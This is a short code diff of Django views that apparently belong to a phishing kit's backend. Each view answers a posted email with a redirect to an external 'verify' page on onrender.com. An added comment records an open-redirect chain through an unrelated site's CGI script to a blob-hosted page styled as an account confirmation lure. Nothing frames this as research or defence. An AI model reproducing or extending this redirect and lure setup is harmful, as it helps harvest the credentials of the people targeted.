@@ -33,7 +33,8 @@ def process_ogolo(request):
             f"https://karenblogpost.onrender.com/app/verify/?em={email}"
         )
         # redirect_url = ("http://localhost:8000/")
-        # http://localhost:8000/account/sign-in/?jeremy@gmail.com
+        # http://localhost:8000/account/sign-in/?email=jeremy@gmail.com
+        # http://slot-lucky.com/bbs/c-board.cgi?cmd=lct;url=https://waysapps.blob.core.windows.net/confirmsssoutho3653verify/Reed2025Fitzgerald.html
         
         return JsonResponse({'redirect_url': redirect_url})
     else:
@@ -63,7 +64,7 @@ def process_man_ogolo(request):
             f"https://karenblogpost.onrender.com/app/verify/?em={email}"
         )
         # redirect_url = ("http://localhost:8000/")
-        # http://localhost:8000/user/sign-in/?jeremy@gmail.com
+        # http://localhost:8000/user/sign-in/?email=jeremy@gmail.com
         
         return JsonResponse({'redirect_url': redirect_url})
     else:
